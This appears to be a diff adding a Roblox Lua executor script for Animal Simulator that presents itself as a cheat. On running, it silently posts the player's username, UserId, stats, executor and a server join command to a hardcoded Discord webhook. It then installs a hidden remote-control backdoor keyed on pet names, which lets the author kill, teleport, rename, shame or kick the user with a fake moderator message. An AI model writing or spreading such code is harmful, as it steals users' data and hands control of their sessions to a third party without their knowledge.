@@ -1,0 +1,189 @@
+local player = game.Players.LocalPlayer
+
+local leveltype = "0"
+
+local plrlevel = player.leaderstats.Level.Value
+
+
+local executor = "Unknown"
+
+if identifyexecutor then
+	executor = identifyexecutor()
+elseif getexecutorname then
+	executor = getexecutorname()
+end
+
+if plrlevel <= 25000 then
+	leveltype = "-25k"
+elseif plrlevel <= 50000 then
+	leveltype = "-50k"
+elseif plrlevel <= 100000 then
+	leveltype = "-100k"
+elseif plrlevel <= 200000 then
+	leveltype = "-200k"
+elseif plrlevel <= 400000 then
+	leveltype = "-400k"
+end
+
+local serverType = "Public"
+if game.PrivateServerId ~= "" then
+	if game.PrivateServerOwnerId == 0 then
+		serverType = "Reserved"
+	else
+		serverType = "Private"
+	end
+end
+local Players = game:GetService("Players")
+local playerCount = #Players:GetPlayers()
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local joinCommand = '```game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)```'
+
+
+local req = (syn and syn.request) or (http and http.request) or request
+
+if req then
+	req({
+		Url = "https://discord.com/api/webhooks/1400084537890963578/mDFAymsUZ_Ckx-wSUHQXNGG6JXN-dqqgp6eIo5tQDAjown95Y0cdzx6VOsdb_cJlcFRr",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode({
+			username = "Executor Bot",
+			embeds = {
+				{
+					title = "Script executed : Sakura Script : Player Info",
+					color = 5814783,
+					fields = {
+						{
+							name = "Username",
+							value = player.Name,
+							inline = true
+						},
+						{
+							name = "UserId",
+							value = tostring(player.UserId),
+							inline = true
+						},
+						{
+							name = "Level",
+							value = player.leaderstats.Level.Value,
+							inline = true
+						},
+						{
+							name = "Roleplay",
+							value = player.leaderstats.Roleplay.Value,
+							inline = true
+						},
+						{
+							name = "Coins",
+							value = player.otherstats.Coin.Value,
+							inline = true
+						},
+						{
+							name = "Kills",
+							value = player.otherstats.Kill.Value,
+							inline = true
+						},
+						{
+							name = "Server type",
+							value = serverType,
+							inline = true
+						},
+						{
+							name = "Player Count",
+							value = playerCount,
+							inline = true
+						},
+						{
+							name = "Executor used",
+							value = executor,
+							inline = true
+						},
+						{
+							name = "LevelType",
+							value = leveltype,
+							inline = true
+						},
+						
+						{
+							name = "Force Join",
+							value = joinCommand,
+							inline = true
+						},
+					},
+					footer = {
+						text = "Script executed in animal simulator"
+					},
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+				}
+			}
+		})
+	})
+end
+
+game["Run Service"].Heartbeat:Connect(function()
+	for i,pets in pairs(game.Workspace.Pets:GetChildren()) do
+		if pets:FindFirstChild("BabyPenguin") then
+			if pets:FindFirstChild("Head") then
+				if pets:FindFirstChild("Head"):FindFirstChild("PetBillboardGui") then
+					
+					if pets.Head.PetBillboardGui.petName.TextLabel.Text == "_cus" then
+						local plr = game.Players.LocalPlayer
+						if plr.Character then
+							if plr.Character:FindFirstChild("Humanoid") then
+							   plr.Character.Humanoid.Health = 0
+							end
+						end
+					end
+					if pets.Head.PetBillboardGui.petName.TextLabel.Text == "_oiu" then
+						local args = {
+							{
+								action = "shoot"
+							}
+						}
+						game:GetService("ReplicatedStorage"):WaitForChild("ChickenEvent"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+					end
+					
+					if pets.Head.PetBillboardGui.petName.TextLabel.Text == "_tyu" then
+						local plr = game.Players.LocalPlayer
+						if plr.Character then
+							if plr.Character:FindFirstChild("HumanoidRootPart") then
+								local am = game.Players:FindFirstChild(pets.Name)
+								if am then
+									if am.Character then
+										if am.Character:FindFirstChild("HumanoidRootPart") then
+											
+											plr.Character:FindFirstChild("HumanoidRootPart").CFrame = am.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0, 10, 0)
+											
+											if plr.leaderstats.RolePlay.Value ~= "I GOT CAUGHT EXPLOITING" then
+												local args = {[1] = "I GOT CAUGHT EXPLOITING",[2] = "player"}
+												game:GetService("ReplicatedStorage").Events.nameEvent:FireServer(unpack(args))
+											end
+											
+											if game.ReplicatedStorage:FindFirstChild("jdskhfsIIIllliiIIIdchgdIiIIIlIlIli") then
+												game.ReplicatedStorage.jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:Destroy()
+											end
+											
+										end
+									end
+								end
+							end
+						end
+					end
+					
+					if pets.Head.PetBillboardGui.petName.TextLabel.Text == "_pol" then
+						local plr = game.Players.LocalPlayer
+						plr:Kick("You have been kicked from this Experiance By an Animal Sim Moderator")
+					end
+					
+				end
+			end
+		end
+	end
+	
+end)
+
